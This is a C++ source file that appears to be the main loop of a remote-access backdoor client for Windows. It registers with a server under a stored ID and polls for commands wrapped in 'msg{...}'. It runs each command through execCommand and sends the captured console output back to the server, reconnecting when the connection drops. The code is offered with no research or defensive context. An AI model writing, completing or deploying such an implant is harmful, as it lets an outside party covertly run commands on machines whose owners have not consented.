#include "addition.h"
#include <string.h>
using namespace mySTL;

int main()
{
    char *str;
    SOCKET *sock = nullptr;
    SOCKET *responseSock = nullptr;
    sockaddr_in *addr;
    char *id = nullptr;
    char *msg;
    int isStart = false;
    if ( (id = readFromFile(ID_FILE_NAME)) == nullptr )
    {
        id = mySTL::addStr(id, "-1");
    }
    char *output = nullptr;
    addr = initPreConnection();
    sock = initConnection(addr);
    sendRequest(sock, id);
    str = readHeader(sock);
    while ( true )
    {
        if (str == nullptr)
        {
            closesocket(*sock);
            free(sock);
            printf("\nClosed\n");
            sock = initConnection(addr);
            sendRequest(sock, id);
            str = readHeader(sock);
            continue;
        }
        else
        {
            printf("%s", str);
            unsigned int lenStr = strlen(str);
            for (int i = 0; i < lenStr ; i++)
            {
                if ( (msg = mySTL::extractMsg(str[i], "msg{$}")) != nullptr )
                {
                    //printf("%s", msg);
                    if ( msg[strlen(msg)-1] == '#')
                    {
                        msg[strlen(msg)-1] = 0;
                        free(id);
                        id = nullptr;
                        id = mySTL::addStr(id, msg);
                        writeToFile(ID_FILE_NAME, id);
                        closesocket(*sock);
                        free(sock);
                        goto endLoop;
                    }
                    if ( !strcmp(msg, "&ping") == false )
                    {
                        isStart = execCommand(msg);
                        //printf("%s", output);
                        break;
                    }
                }
            }
            free(str);
            str = nullptr;
        }
        if (isStart == true)
        {
            output = readConsoleOutput(hReadPipe1);

        }
        if ( output != nullptr )
        {
            if (responseSock != nullptr)
            {
                closesocket(*responseSock);
                free(responseSock);
            }

            //printf("output: %s", output);
            responseSock = initConnection(addr);
            sendConsoleOutput(responseSock, output, id);
            //Sleep(1);
            free(output);
            output = nullptr;
        }
        Sleep(LOOP_TIME_WAIT);
endLoop:
        str = listenData(sock);
    }
}
